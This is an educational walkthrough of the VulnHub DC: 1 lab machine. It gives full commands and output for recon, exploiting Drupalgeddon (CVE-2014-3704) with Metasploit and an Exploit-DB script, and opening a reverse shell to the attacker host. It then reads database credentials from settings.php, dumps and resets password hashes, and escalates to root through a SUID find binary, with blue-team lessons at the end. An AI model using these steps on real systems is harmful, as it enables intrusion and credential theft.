# DC: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational, step-by-step walkthrough for students. This is the first machine in
> the **DC** series by DCAU. It is intentionally vulnerable and must only ever be
> run on an isolated lab network.

| Field | Value |
| --- | --- |
| **Machine** | DC: 1 |
| **Difficulty** | Beginner |
| **Author** | DCAU |
| **Released** | 28 February 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/dc-1,292/> |
| **Download** | <https://vulnhub.com/entry/dc-1,292/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux — Debian 7 32-bit (kernel 3.2), Apache 2.2.22 + Drupal 7 |

> **Note:** exact banners, ports and file contents can differ slightly between the
> VirtualBox and VMware builds of this box ("varies by build"). The attack *chain*
> below is stable; small details (a service version, a directory listing) may move
> around. When in doubt, re-run the enumeration yourself.

---

## 0. What you will learn

- How to find a target host on an isolated lab network (ARP scan + Nmap).
- How to read a port scan and spot a **CMS (Content Management System)** behind a web server.
- How to fingerprint **Drupal 7** and look up its known vulnerabilities.
- What **Drupalgeddon** is (CVE-2014-3704) and how a single old CMS bug gives a shell.
- How to read a CMS config file (`settings.php`) to steal **database credentials**.
- How to dump a Drupal `users` table and deal with a PHPass password hash.
- How to abuse a **SUID `find` binary** to become root (GTFOBins).
- How to think like a defender and stop every one of the above.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so its IP can change every time you import it — always confirm.

First look at your own network interface. This tells you which subnet to scan.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network. The `/24` says the first three numbers are shared, so
> the target will also have a `192.168.56.x` address.

Now sweep the subnet for live hosts.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` asks every address "who has this IP?" over ARP and
> lists whoever answers. ARP is fast and a host firewall usually can't hide from
> it. The MAC starting `08:00:27` is a VirtualBox network card.

`netdiscover -r 192.168.56.0/24` does the same job if you prefer it.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

Now ask Nmap to identify the services and versions on those ports.

```bash
sudo nmap -sC -sV -p 22,80,111 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt
|_/install.php /LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **Why it works:** `-p-` scans all 65,535 TCP ports, `-sV` guesses each service
> version and `-sC` runs Nmap's safe default scripts. Two things stand out:
> a **web server on port 80** and a meta tag telling us the site is built on
> **Drupal 7**. Port 111 (rpcbind) is noise we can ignore. Web apps are almost
> always the biggest attack surface, so we start there.

![Nmap service scan output](images/02-nmap.png)

### 2.2 Fingerprinting the CMS

The web page source contains `<meta name="Generator" content="Drupal 7 ...">`.
We can also ask Nmap to run its vulnerability scripts:

```bash
sudo nmap -sV -p 80 --script http-vuln-cve2014-3704,http-enum 192.168.56.101
```

```text
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-vuln-cve2014-3704:
|   VULNERABLE:
|   Drupal - pre Auth SQL Injection Vulnerability  (Drupalgeddon)
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-3704
|_http-enum:
|   /CHANGELOG.txt: Drupal file
|   /: Drupal version 7
```

> **Why it works:** the script literally names the bug: **CVE-2014-3704**, the
> famous "Drupalgeddon" pre-authentication SQL injection in Drupal 7 before
> version 7.32. This box ships Drupal **7.24**, so it is vulnerable. We don't even
> need valid credentials to exploit it.

Browse the site manually to confirm.

```bash
curl -s http://192.168.56.101/ | grep -i generator
curl -s http://192.168.56.101/CHANGELOG.txt | head -n 5
```

```text
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
Drupal 7.24, 2013-11-20
```

> **Why it matters:** we now know the product (Drupal), the major version (7) and
> the exact version (7.24). That is enough to pick an exploit.

![Fingerprinting Drupal in the page source](images/03-enum.png)

---

## 3. Foothold

### 3.1 The vulnerability — Drupalgeddon (CVE-2014-3704)

Drupal 7 builds SQL `IN (...)` clauses from user-supplied array keys. Before
7.32 it did this safely-looking placeholder expansion incorrectly, so an attacker
can smuggle extra SQL into a query by crafting an array key. Because the bug is
reachable on the login/registration form **before** you authenticate, an attacker
can inject a brand-new **administrator user** — or run arbitrary SQL — with a
single request. It is rated critical (SA-CORE-2014-005).

### 3.2 Exploit it with Metasploit

```bash
msfconsole -q
```

```text
msf6 > search drupal drupageddon
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.56.101
msf6 exploit(multi/http/drupal_drupageddon) > set TARGETURI /
msf6 exploit(multi/http/drupal_drupageddon) > set LHOST 192.168.56.10
msf6 exploit(multi/http/drupal_drupageddon) > set TARGET 0
msf6 exploit(multi/http/drupal_drupageddon) > run
```

```text
[*] Sending stage (39736 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.101:49876)
meterpreter > getuid
Server username: www-data
```

> **Why it works:** the module exploits CVE-2014-3704 to run a tiny PHP payload,
> which connects back to our `LHOST`/`LPORT`. The web server executes PHP as its
> own account, `www-data` — our first, low-privilege shell. (If `TARGET 0` fails,
> try `TARGET 1`; the alternate target is a different PHP payload style.)

**Alternative (manual):** the classic admin-adding exploit is Exploit-DB 34992.

```bash
searchsploit -m 34992.py
python2 34992.py -t http://192.168.56.101 -u hacker -p Passw0rd!
```

Then log in to `http://192.168.56.101/user/login` as `hacker` and use the Drupal
UI (or the same shell techniques below). **Drupalgeddon2** (CVE-2018-7600,
Metasploit `exploit/unix/webapp/drupal_drupalgeddon2`) also works on this box and
is a good second technique to practise.

### 3.3 Drop to a system shell

```text
meterpreter > shell
Process 1234 created.
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www
```

Upgrade to a proper TTY so you get command history, tab-completion and `Ctrl+C`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
```

![Reverse shell caught as www-data](images/04-foothold.png)

### 3.4 Flags 1 and 2 — and database credentials

Look around the web root.

```bash
ls -la /var/www
cat /var/www/flag1.txt
```

```text
Every good CMS needs a config file - and so do you.
```

> **Why it matters:** flag 1 is a hint. It is telling us to go read Drupal's
> **config file**, `sites/default/settings.php`.

```bash
cat /var/www/sites/default/settings.php | grep -A6 databases
```

```text
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
...
Brute force and dictionary attacks aren't the only ways to gain access
(and you will need access). What can you do with these credentials?
```

> **Why it works:** many installers leave credentials in a readable config file.
> Anyone who can read `settings.php` (which the web user can) learns the database
> password. Flag 2 is a hint that we should use these credentials rather than
> brute-force anything.

### 3.5 Dump the Drupal users table

```bash
mysql -u dbuser -pR0ck3t -D drupaldb -e "SELECT uid,name,pass FROM users;"
```

```text
+-----+-------+--------------------------------------------------------------+
| uid | name  | pass                                                         |
+-----+-------+--------------------------------------------------------------+
|   0 |       |                                                              |
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR       |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg       |
+-----+-------+--------------------------------------------------------------+
```

> **Why it works:** Drupal stores passwords in a portable PHPass format that
> starts with `$S$`. It is salted and stretched (many rounds), so it is *slow* to
> crack — that is intentional. We have two options (below).

### 3.6 Get the admin password two ways

**Option A — crack the hash offline:**

```bash
echo '$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# or: hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
```

**Option B — just reset it using Drupal's own hashing tool (faster for beginners):**

```bash
cd /var/www
php scripts/password-hash.sh 'MyNewPass123'
```

```text
password: MyNewPass123   hash: $S$DkIkdKLIvRK0iVHm99Y9X8jrFw7rRvYG0sSm1FLVV3z5Dqzui9r
```

```bash
mysql -u dbuser -pR0ck3t -D drupaldb \
  -e "UPDATE users SET pass='\$S\$DkIkdKLIvRK0iVHm99Y9X8jrFw7rRvYG0sSm1FLVV3z5Dqzui9r' WHERE name='admin';"
```

> **Why it works:** Drupal's `password-hash.sh` produces a hash in the exact
> format Drupal expects. Writing that hash straight into the `users` table is
> equivalent to setting a new password — we never needed to crack the old one.
> Log in at `http://192.168.56.101/user/login` as `admin` / `MyNewPass123`.

### 3.7 Flag 3 — inside the admin panel

Once logged in, the Drupal **Dashboard** shows a leftover piece of content
("flag3"):

```text
Special PERMS will help FIND the passwd - but you'll need to -exec that command
to work out how to get what's in the shadow.
```

> **Why it matters:** this is the box telling us how to get root — it is a hint
> about the **SUID `find`** trick (see section 4).

### 3.8 Flag 4 — a home directory

```bash
ls -la /home
cat /home/flag4/flag4.txt
```

```text
Can you use this same method to find or access the flag in root?
```

> **Why it matters:** flag 4 confirms the intended path: use the *same* technique
> that found this file to reach the flag in `/root`.

![User-side flags](images/05-shell.png)

---

## 4. Privilege escalation

### 4.1 Look for SUID binaries

A SUID binary runs with the **file owner's** privileges, not yours. If `find` is
owned by root *and* has the SUID bit, it will run as root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/bin/su
/bin/ping
/usr/bin/passwd
/usr/bin/find        <-- owned by root, SUID set
...
```

> **Why it works:** `-perm -4000` matches files with the setuid bit. Most hits are
> legitimate, but **`/usr/bin/find` should never be SUID**. `find` can execute a
> command with `-exec`, and because `find` runs as root, so does that command.

### 4.2 Escape to a root shell

```bash
find . -exec /bin/sh \; -quit
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

> **Why it works:** the shell is spawned by the SUID `find`, so it inherits
> **euid=0** (effective root). The `-quit` just makes `find` stop after the first
> match. This is a textbook [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
> technique. Note the uid still says `www-data` while `euid` is `0` — you have
> root authority even though `whoami` can look confusing.

### The final flag

```bash
cat /root/thefinalflag.txt
```

```text
Well done. ... Hopefully you've enjoyed this and learned some new skills.
```

![Root proof and final flag](images/06-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Unpatched Drupal 7.24 | `http://192.168.56.101/` | Known critical RCE/SQLi bugs exposed |
| 2 | Drupalgeddon pre-auth SQL injection (CVE-2014-3704 / SA-CORE-2014-005) | Drupal form handling | Remote code execution as `www-data` |
| 3 | Database credentials stored in a web-readable config file | `/var/www/sites/default/settings.php` | Full Drupal DB access (`dbuser:R0ck3t`) |
| 4 | Weak password storage / password reset by DB write | Drupal `users` table (`$S$` PHPass) | Admin login → ease of foothold-to-admin |
| 5 | SUID bit set on `/usr/bin/find` | `/usr/bin/find` (root-owned, SUID) | Trivial local privilege escalation to root |

## 6. Defensive lessons (blue team)

- **Patch your CMS.** Drupalgeddon was fixed in 7.32; keep Drupal (and every web
  app) on a supported version and subscribe to the vendor's security advisories.
- **Least privilege for file permissions.** `settings.php` should not be readable
  by the web server account any more than necessary, and DB users should have only
  the rights the app truly needs.
- **Never store plaintext secrets in the docroot.** Use environment variables or a
  secrets manager; rotate DB passwords; don't let a web compromise equal a DB
  compromise.
- **Enforce strong, slow hashing and rate-limits.** PHPass is slow by design — but
  a database write that resets a password should itself be protected (least
  privilege, monitoring for anomalous `UPDATE users`).
- **Audit SUID/SGID binaries.** `find / -perm -4000 -type f` is a *defender's*
  command too. No standard `find`, `vim`, `less`, `cp` should ever be SUID.
- **Detection ideas:** alert on `GET`/`POST` to Drupal login endpoints with array
  syntax (`[#...]`) in parameters; on outbound connections originating from
  `www-data`; and on new processes spawning a shell directly from `find`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/dc-1,292/>
- Drupal security advisory: <https://www.drupal.org/SA-CORE-2014-005>
- CVE-2014-3704 (NVD): <https://nvd.nist.gov/vuln/detail/CVE-2014-3704>
- Exploit-DB 34992 — Drupalgeddon (add admin user): <https://www.exploit-db.com/exploits/34992>
- Drupalgeddon2 (CVE-2018-7600) PoC: <https://github.com/dreadlocked/Drupalgeddon2>
- GTFOBins — `find`: <https://gtfobins.github.io/gtfobins/find/>
- Community writeups consulted:
  - [svesec/vulnhub-dc1 (GitHub)](https://github.com/svesec/vulnhub-dc1)
  - [Vulnhub DC-1 Walkthrough — Bazil Brohi (Medium)](https://mob1us86.medium.com/vulnhub-dc-1-walkthrough-939303a5b70a)
  - [DC-1: Vulnhub Walkthrough — Chikleet (Medium)](https://medium.com/@chikleet25/dc-1-vulnhub-walkthrough-878c94996a18)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan / netdiscover)
- [ ] `images/02-nmap.png` — port/service scan showing Drupal 7 on port 80
- [ ] `images/03-enum.png` — fingerprinting Drupal / CVE-2014-3704
- [ ] `images/04-foothold.png` — Metasploit Drupalgeddon session as `www-data`
- [ ] `images/05-shell.png` — `/var/www` flags and `settings.php` credentials
- [ ] `images/06-root-flag.png` — SUID `find` root shell and `/root/thefinalflag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
